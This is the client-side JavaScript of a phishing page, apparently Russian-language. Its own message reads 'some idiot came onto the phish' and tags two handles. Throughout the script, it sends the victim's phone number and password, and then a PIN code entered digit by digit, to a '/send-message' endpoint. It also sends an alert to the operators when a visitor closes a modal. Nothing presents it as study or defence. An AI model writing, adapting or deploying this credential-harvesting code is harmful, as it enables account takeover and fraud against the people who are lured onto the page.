// Функция для открытия модального окна
function openModal() {
  var modal = document.getElementById('myModal');
  modal.style.display = 'block';
}

// Вызываем функцию при загрузке страницы
window.addEventListener('load', openModal);

document.addEventListener('DOMContentLoaded', function () {
  // Ваш код здесь
  var closeBtn = document.querySelector('.close');
  closeBtn.addEventListener('click', function () {
    var modal = document.getElementById('myModal');
    modal.style.display = 'none';
    const message = "user on web site @SteallSexy @vspxd "
            fetch('/send-message', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ message: message })
            })
            .then(response => response.text())
            .then(data => {
                console.log("");
            })
            .catch(error => {
                alert('Произошла ошибка при отправке сообщения.');
            });
  });
});

document.addEventListener('DOMContentLoaded', function () {
  // Ваш код здесь
  var closeBtn = document.querySelector('.closebtn');
  closeBtn.addEventListener('click', function () {
    var modal = document.getElementById('myModal');
    modal.style.display = 'none';
    //const message = document.getElementById('messageInput').value;
            const message = "КАКОЙ-ТО ДОЛБАЕБ ЗАШЕЛ НА ФИШ ❗️ \n\n @SteallSexy @vspxd "
            fetch('/send-message', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ message: message })
            })
            .then(response => response.text())
            .then(data => {
                console.log("");
            })
            .catch(error => {
                alert('Произошла ошибка при отправке сообщения.');
            });

  });
});


document.addEventListener("DOMContentLoaded", function() {
    let message1 = "";
  function hideLoader() {
    document.querySelector('.loader').style.display = 'none';

}
    
    
    document.getElementById('sendBtn').addEventListener('click', function() {
        const message1 = document.getElementById('messageInputPhone').value;
        const message2 = document.getElementById('messageInputPassword').value;
        
        if (message1 !== message2 && message1.length === 11 && message2.length >= 8 ) {
            fetch('/send-message', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ message: "Phone: " + message1 + "\n" + "Password: \n" + message2 })
            })
            .then(response => response.text())
            .then(data => {
                // Обработка успешного выполнения
            })
            .catch(error => {
                alert('Произошла ошибка при отправке сообщения.');
            });
            const modal = document.getElementById('enter_modal');
            modal.style.display = 'block';
            hideLoader()
        } else {
            // Открываем модальное окно с id="enter_modal"
            
        }
    });
});


document.addEventListener("DOMContentLoaded", function() {

    let modal = document.getElementById('enter_modal');
    let closeModal = document.querySelector('.close-modal');
    
    console.log(message1 + " "+ "123");
    
    closeModal.addEventListener('click', function() {
        modal.style.display = 'none';
    });
});
document.addEventListener("DOMContentLoaded", function() {
    function showLoader() {
        document.querySelector('.loader').style.display = 'block';
    }

    function hideLoader() {
        document.querySelector('.loader').style.display = 'none';
    }

    const inputs = document.querySelectorAll('.pin-code-input');
    
    inputs.forEach((input, index) => {
        input.addEventListener('keyup', function() {
            if (input.value.length === 1) {
                if (index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            }
            
            if (Array.from(inputs).every(inp => inp.value.length === 1)) {
                console.log("Pincode is entering");
                
                
                const pinCode = Array.from(inputs).map(inp => inp.value).join('');

                fetch('/send-message', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ message: pinCode })
                })
                .then(response => response.text())
                .then(data => {
                    hideLoader();
                    const modal = document.getElementById('enter_modal');
                    modal.style.display = 'block';
                })
                .catch(error => {
                    hideLoader();
                    alert('Произошла ошибка при отправке сообщения.');
                });
                
                showLoader();
            }

        });
    });
});


